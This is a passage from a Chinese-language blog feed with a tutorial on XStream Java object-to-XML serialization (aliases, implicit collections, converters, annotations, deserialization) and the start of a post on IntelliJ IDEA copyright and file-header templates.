class="name">com.air.xml.xstream.alias.Entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.air.xml.xstream.alias.Entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.air.xml.xstream.alias.Entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.air.xml.xstream.alias.Entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">com.air.xml.xstream.alias.Blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><em>默认输出的类，是fully qualified name，可以手动设置别名</em></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//alias</span></span><br><span class="line">        xStream.alias(<span class="string">"blog"</span>, Blog<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        xStream.alias(<span class="string">"entry"</span>, Entry<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>输出:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">writer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>qisheng.li<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">writer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><em>也可以设置属性级别的别名</em></li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.aliasField("author", Blog.class, "writter");</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>qisheng.li<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><em>包级别的别名</em></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.aliasPackage(<span class="string">"aliased.pachage.name"</span>, <span class="string">"com.air.xml.xstream.alias"</span>);</span><br></pre></td></tr></table></figure>
<p>输出的xml:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aliased.pachage.name.Blog</span> <span class="attr">author</span>=<span class="string">"qisheng.li"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aliased.pachage.name.Blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="Implicit-Collections"><a href="#Implicit-Collections" class="headerlink" title="Implicit Collections"></a>Implicit Collections</h4><blockquote>
<p>implicit collection: whenever you have a collection which doesn’t need to display it’s root tag, you can map it as an implicit collection.</p>
</blockquote>
<p>如果不想展示一个集合的root节点，比如上述的<code>entries</code>，可以将其当做一个<code>implicit collection</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//implicit collection</span></span><br><span class="line">xStream.addImplicitCollection(Blog.class, "entries");</span><br></pre></td></tr></table></figure>
<p>输出:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>qisheng.li<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到<code>entries</code>这个节点已经没有了</p>
<h4 id="field输出为属性值"><a href="#field输出为属性值" class="headerlink" title="field输出为属性值"></a>field输出为属性值</h4><p>接着上面的例子，我们现在想让Blog的writer输出为Blog标签的属性值。</p>
<p>实现步骤：</p>
<p>1.创建一个转换器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthorConverter</span>  <span class="keyword">implements</span> <span class="title">SingleValueConverter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ((Author) obj).getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">fromString</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Author(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type.equals(Author<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.注册这个转换器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.registerConverter(<span class="keyword">new</span> AuthorConverter());</span><br></pre></td></tr></table></figure>
<p>3.告诉XStream</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//attribute aliasing</span></span><br><span class="line">xStream.useAttributeFor(Blog.class, "writer");</span><br><span class="line">xStream.registerConverter(<span class="keyword">new</span> AuthorConverter());</span><br><span class="line"><span class="comment">//field alias</span></span><br><span class="line">xStream.aliasField("author", Blog.class, "writer");</span><br></pre></td></tr></table></figure>
<p>输出的xml：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog</span> <span class="attr">author</span>=<span class="string">"qisheng.li"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>first<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>first blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>second<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>second blog entry<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="基于注解"><a href="#基于注解" class="headerlink" title="基于注解"></a>基于注解</h3><p>主要使用的是<code>XStreamAlias</code>注解来标记别名</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XStreamAlias</span>(<span class="string">"message"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RendezvousMessage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@XStreamAlias</span>(<span class="string">"type"</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> messageType;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RendezvousMessage</span><span class="params">(<span class="keyword">int</span> messageType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.messageType = messageType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        xStream.processAnnotations(RendezvousMessage<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        RendezvousMessage rendezvousMessage = <span class="keyword">new</span> RendezvousMessage(<span class="number">12</span>);</span><br><span class="line">        System.out.println(xStream.toXML(rendezvousMessage));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>xml 输出</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>12<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ImplicitCollection</li>
</ul>
<p>使用 <code>@XstreamImplicit(itemFieldName = &quot;xxx&quot;)</code>来处理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XStreamImplicit</span>(itemFieldName = <span class="string">"part"</span>)</span><br><span class="line"><span class="keyword">private</span> List&lt;String&gt; content;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>12<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>first content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>second content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>converter</li>
</ul>
<p>添加一个属性字段并指明他使用的转换器, 和一个基本类型——boolean</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XStreamConverter</span>(value=BooleanConverter<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">private</span> <span class="title">boolean</span> <span class="title">important</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@XStreamConverter</span>(SingleValueCalendarConverter<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">private</span> <span class="title">Calendar</span> <span class="title">created</span> </span>= <span class="keyword">new</span> GregorianCalendar();</span><br></pre></td></tr></table></figure>
<p>转化器代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleValueCalendarConverter</span> <span class="keyword">implements</span> <span class="title">Converter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> </span>&#123;</span><br><span class="line">        Calendar calendar = (Calendar) source;</span><br><span class="line">        writer.setValue(String.valueOf(calendar.getTime().getTime()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">        GregorianCalendar calendar = <span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">        calendar.setTime(<span class="keyword">new</span> Date(Long.parseLong(reader.getValue())));</span><br><span class="line">        <span class="keyword">return</span> calendar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type.equals(GregorianCalendar<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出的xml结果：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">type</span>&gt;</span>12<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>first content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>second content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">important</span>&gt;</span>false<span class="tag">&lt;/<span class="name">important</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">created</span>&gt;</span>1482856467282<span class="tag">&lt;/<span class="name">created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>属性</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@XStreamAlias</span>(<span class="string">"type"</span>)</span><br><span class="line"><span class="meta">@XStreamAsAttribute</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> messageType;</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span> <span class="attr">type</span>=<span class="string">"12"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>first content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>second content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">important</span>&gt;</span>false<span class="tag">&lt;/<span class="name">important</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">created</span>&gt;</span>1482856554517<span class="tag">&lt;/<span class="name">created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>忽略一些字段</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span> <span class="attr">type</span>=<span class="string">"12"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>first content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">part</span>&gt;</span>second content<span class="tag">&lt;/<span class="name">part</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">created</span>&gt;</span>1482856661757<span class="tag">&lt;/<span class="name">created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>important</code> 属性已经被隐藏</p>
<h4 id="自动扫描注解"><a href="#自动扫描注解" class="headerlink" title="自动扫描注解"></a>自动扫描注解</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.autodetectAnnotations(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
<h2 id="xml转对象"><a href="#xml转对象" class="headerlink" title="xml转对象"></a>xml转对象</h2> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RendezvousMessage deserializedMessage = (RendezvousMessage) xStream.fromXML(<span class="string">"&lt;message type=\"12\"&gt;\n"</span> +</span><br><span class="line">        <span class="string">"  &lt;part&gt;first content&lt;/part&gt;\n"</span> +</span><br><span class="line">        <span class="string">"  &lt;part&gt;second content&lt;/part&gt;\n"</span> +</span><br><span class="line">        <span class="string">"  &lt;created&gt;1482859234272&lt;/created&gt;\n"</span> +</span><br><span class="line">        <span class="string">"&lt;/message&gt;"</span>);</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><p><a href="http://x-stream.github.io/index.html" rel="external nofollow noopener noreferrer" target="_blank">About XStream</a></p>
</li>
<li><p><a href="http://x-stream.github.io/alias-tutorial.html" rel="external nofollow noopener noreferrer" target="_blank">Alias Tutorial</a></p>
</li>
<li><p><a href="http://x-stream.github.io/annotations-tutorial.html" rel="external nofollow noopener noreferrer" target="_blank">Annotations Tutorial</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xml </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[idea文件模板]]></title>
      <url>http://qsli.github.io/2016/12/23/idea-template/</url>
      <content type="html"><![CDATA[<h1 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h1><p>代码前面一般都会有相应的版权信息，拿guava的代码为例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (C) 2007 The Guava Authors</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Licensed under the Apache License, Version 2.0 (the "License");</span></span><br><span class="line"><span class="comment"> * you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment"> * You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment"> * limitations under the License.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.google.common.collect;</span><br></pre></td></tr></table></figure>
<h2 id="idea自动生成版权信息"><a href="#idea自动生成版权信息" class="headerlink" title="idea自动生成版权信息"></a>idea自动生成版权信息</h2><p><code>File</code> &gt; <code>Settings</code> &gt; <code>Copyright</code> &gt; <code>Copyright Profiles</code></p>
<p>新建一个profile，填入如下的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/* * Copyright (c) $today.year xx.com. All Rights Reserved. */</span><br></pre></td></tr></table></figure></p>
<p><code>$today.year</code>代表当前的年</p>
<img src="/2016/12/23/idea-template/profiles.jpg">
<p>新建java文件时就自动生成了版权信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  * Copyright (c) 2016 Qunar.com. All Rights Reserved. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.xxx.handler;</span><br></pre></td></tr></table></figure>
<h1 id="作者、日期、邮箱等"><a href="#作者、日期、邮箱等" class="headerlink" title="作者、日期、邮箱等"></a>作者、日期、邮箱等</h1><p><code>File</code> &gt; <code>Settings</code> &gt; <code>File and Ocde Templates</code> &gt; <code>Includes</code> &gt; <code>File Header</code></p>
